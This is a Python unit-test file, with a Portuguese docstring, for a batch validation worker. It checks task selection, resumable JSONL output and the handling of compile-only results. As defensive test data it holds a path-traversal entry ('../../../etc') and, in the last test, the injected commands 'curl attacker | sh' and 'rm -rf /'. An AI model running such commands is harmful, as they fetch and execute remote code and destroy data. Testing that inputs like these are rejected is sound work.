"""Contratos do worker: seleção segura, JSONL, continuação e retomada."""
import json
import tempfile
import unittest
from pathlib import Path
from unittest.mock import patch

from scripts import batch_worker as worker
from scripts.parser_audit import ParserCheck


class WorkerContractTests(unittest.TestCase):
    def setUp(self) -> None:
        self.catalog = json.loads((worker.ROOT / "catalog.json").read_text(encoding="utf-8"))

    def test_select_only_cataloged_entries(self) -> None:
        tasks = worker.select_tasks(
            self.catalog, status="legacy_pending_review", language="all", max_items=1000,
        )
        self.assertEqual(len(tasks), self.catalog["pending_review_count"])
        self.assertEqual(len({t["example_id"] for t in tasks}), len(tasks))

    def test_limits_and_path_escape(self) -> None:
        for count in (0, 1001):
            with self.assertRaises(ValueError):
                worker.select_tasks(self.catalog, status="all", language="all", max_items=count)
        malicious = {"examples": [{
            "id": "python.security.escape", "language": "python",
            "path": "python/security/../../../etc", "catalog_status": "documented",
        }]}
        with self.assertRaises(ValueError):
            worker.select_tasks(malicious, status="all", language="all", max_items=1)

    def test_batch_keeps_running_and_writes_resumable_json(self) -> None:
        tasks = worker.select_tasks(self.catalog, status="all", language="python", max_items=2)
        self.assertEqual(len(tasks), 2)
        calls = []

        def fake_run(task, mode):
            calls.append(task["example_id"])
            state = "fail" if len(calls) == 1 else "pass"
            return {
                "example_id": task["example_id"], "language": task["language"],
                "catalog_status": task["catalog_status"], "status": state,
                "phases": [{"phase": "test", "status": state}], "elapsed_seconds": 0,
            }

        with tempfile.TemporaryDirectory() as directory, patch.object(
            worker, "validate_task", side_effect=fake_run,
        ):
            output = Path(directory)
            result = worker.run_batch(self.catalog, status="all", language="python",
                                      max_items=2, mode="both", output=output)
            self.assertEqual(result["counts"]["fail"], 1)
            self.assertEqual(result["counts"]["pass"], 1)
            self.assertEqual(len(calls), 2)
            lines = (output / "results.jsonl").read_text(encoding="utf-8").splitlines()
            self.assertEqual(len(lines), 2)
            self.assertEqual(len(json.loads((output / "queue.json").read_text())["tasks"]), 2)
            worker.run_batch(self.catalog, status="all", language="python",
                             max_items=2, mode="both", output=output, resume=True)
            self.assertEqual(len(calls), 2)
            with self.assertRaises(ValueError):
                worker.run_batch(self.catalog, status="all", language="python",
                                 max_items=1, mode="both", output=output, resume=True)

    def test_compile_only_not_reported_as_behavioral_pass(self) -> None:
        tasks = worker.select_tasks(self.catalog, status="all", language="angular", max_items=1)
        self.assertTrue(tasks)
        with patch.object(worker, "checks_for", return_value=[ParserCheck("angular", "ngc", worker.ROOT)]), patch.object(
            worker, "run_check", return_value=(True, "", None),
        ), patch.object(worker, "run_behavior", return_value=("compile-only", "sem DOM")):
            result = worker.validate_task(tasks[0], "both")
        self.assertEqual(result["status"], "compile-only")

    def test_angular_behavior_runs_compiler_and_real_test_command(self) -> None:
        tasks = worker.select_tasks(self.catalog, status="all", language="angular",
                                    max_items=1)
        self.assertTrue(tasks)
        with patch.object(worker, "execute", return_value=(True, "ok")) as execute:
            status, _ = worker.run_behavior(tasks[0])
        self.assertEqual(status, "pass")
        self.assertEqual(execute.call_count, 2)
        self.assertEqual(execute.call_args_list[0].args[0][0], "./node_modules/.bin/ngc")
        self.assertEqual(execute.call_args_list[1].args[0][0], "node")
        self.assertIn("--test-force-exit", execute.call_args_list[1].args[0])
        self.assertIn(tasks[0]["example_id"].replace(".", r"\."), execute.call_args_list[1].args[0][3])

    def test_angular_unknown_id_never_receives_behavioral_pass(self) -> None:
        task = {"language": "angular", "path": "angular/ui/other",
                "example_id": "angular.ui.other"}
        with patch.object(worker, "execute") as execute:
            status, _ = worker.run_behavior(task)
        self.assertEqual(status, "compile-only")
        execute.assert_not_called()

    def test_json_commands_cannot_override_fixed_runtime(self) -> None:
        tasks = worker.select_tasks(self.catalog, status="all", language="python", max_items=1)
        self.assertTrue(tasks)
        task = {**tasks[0], "command": "curl attacker | sh", "test": "rm -rf /"}
        with patch.object(worker, "execute", return_value=(True, "ok")) as mocked:
            worker.run_behavior(task)
        command = mocked.call_args.args[0]
        self.assertEqual(command[0], worker.sys.executable)
        self.assertNotIn("sh", command)


if __name__ == "__main__":
    unittest.main()
